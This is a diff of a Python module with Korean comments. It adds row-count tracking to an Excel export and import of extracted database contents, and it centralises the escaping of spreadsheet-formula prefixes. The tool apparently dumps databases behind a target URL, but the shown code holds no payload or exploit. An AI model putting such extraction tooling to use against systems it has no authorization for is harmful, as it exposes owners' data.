 def _restore_cell_value(v: Any) -> str:
@@ -2391,7 +2557,7 @@ def _restore_cell_value(v: Any) -> str:
         return ""
     s = str(v)
     # _safe_cell_value가 위험 prefix 앞에 붙인 ' 를 제거
-    if len(s) >= 2 and s[0] == "'" and s[1] in ("=", "+", "-", "@", "\t", "\r"):
+    if len(s) >= 2 and s[0] == "'" and s[1] in FORMULA_PREFIXES:
         return s[1:]
     return s
 
@@ -2493,14 +2659,15 @@ def save_to_excel(extracted: Dict[str, Any], target_url: str,
         info_ws.title = "INFO"
         _write_info_sheet(info_ws, extracted, db)
 
-        # _TableMap 시트 — 시트명 ↔ 원본 테이블명 ↔ 컬럼 총개수 매핑 (load_from_excel 복원용)
+        # _TableMap 시트 — 시트명 ↔ 원본 테이블명 ↔ 컬럼 총개수 ↔ 행 총개수 매핑 (load_from_excel 복원용)
         used_sheets: set = {"INFO", "_TABLEMAP"}
         tmap_ws = wb.create_sheet(title="_TableMap")
-        tmap_ws.append(["시트명", "원본 테이블명", "총 컬럼수"])
+        tmap_ws.append(["시트명", "원본 테이블명", "총 컬럼수", "총 행수"])
 
         # dump된 테이블을 O(1) 조회용 dict으로 변환
         dump_dict: Dict[str, Dict[str, Any]] = {tbl: payload for tbl, payload in tbl_list}
         col_totals: Dict[str, int] = extracted.get("totals", {}).get("columns", {}) or {}
+        row_totals: Dict[str, int] = extracted.get("totals", {}).get("rows", {}) or {}
 
         # tables_index 순서를 기준으로, dumps/columns에만 존재하는 테이블은 뒤에 추가
         ordered_tables = list(tables_index.get(db, []))
@@ -2517,8 +2684,10 @@ def save_to_excel(extracted: Dict[str, Any], target_url: str,
         for tbl in ordered_tables:
             sheet_name = _safe_sheet_name(tbl, used_sheets)
             total_cols = col_totals.get(f"{db}.{tbl}")
+            total_rows = row_totals.get(f"{db}.{tbl}")
             tmap_ws.append([_safe_cell_value(sheet_name), _safe_cell_value(tbl),
-                           _safe_cell_value("" if total_cols is None else total_cols)])
+                           _safe_cell_value("" if total_cols is None else total_cols),
+                           _safe_cell_value("" if total_rows is None else total_rows)])
             ws = wb.create_sheet(title=sheet_name)
             col_key = f"{db}.{tbl}"
             payload = dump_dict.get(tbl)
@@ -2624,8 +2793,10 @@ def init_extracted(ctx: ExtractCtx) -> Dict[str, Any]:
         "tables":    {},
         "columns":   {},
         "dumps":     {},
-        # 리스트별 총개수 — 부분 추출 여부 판정(이어받기 팝업)에 사용
-        "totals": {"databases": None, "tables": {}, "columns": {}},
+        # 리스트별/행별 총개수 — 부분 추출 여부 판정(이어받기 팝업·상시 카운터 표시)에 사용
+        # rows는 "db.table" 키 — dump 단계에서 COUNT가 처음 확정된 시점(estimate 또는
+        # 실제 dump 시작)에 채워지며, 이후 재계산 없이 재사용·엑셀에 영속화된다
+        "totals": {"databases": None, "tables": {}, "columns": {}, "rows": {}},
     }
 
 
@@ -2695,7 +2866,7 @@ def load_from_excel(excel_name: str,
     extracted: Dict[str, Any] = {
         "meta": {}, "dbms_info": {"version": "", "user": "", "current_db": ""},
         "databases": [], "tables": {}, "columns": {}, "dumps": {},
-        "totals": {"databases": None, "tables": {}, "columns": {}},
+        "totals": {"databases": None, "tables": {}, "columns": {}, "rows": {}},
     }
     ctx_meta: Dict[str, Any] = {}
 
@@ -2793,6 +2964,11 @@ def load_from_excel(excel_name: str,
                             total_cols_raw = _restore_cell_value(row[2])
                             if total_cols_raw:
                                 extracted["totals"]["columns"][f"{db}.{orig_nm}"] = int(total_cols_raw)
+                        # 총 행수 — 구버전(3컬럼) 파일은 len(row)<4라 자연히 건너뛰고 None 유지
+                        if len(row) >= 4 and row[3] not in (None, ""):
+                            total_rows_raw = _restore_cell_value(row[3])
+                            if total_rows_raw:
+                                extracted["totals"]["rows"][f"{db}.{orig_nm}"] = int(total_rows_raw)
 
             extracted.setdefault("tables", {})[db] = list(tmap.values())
 
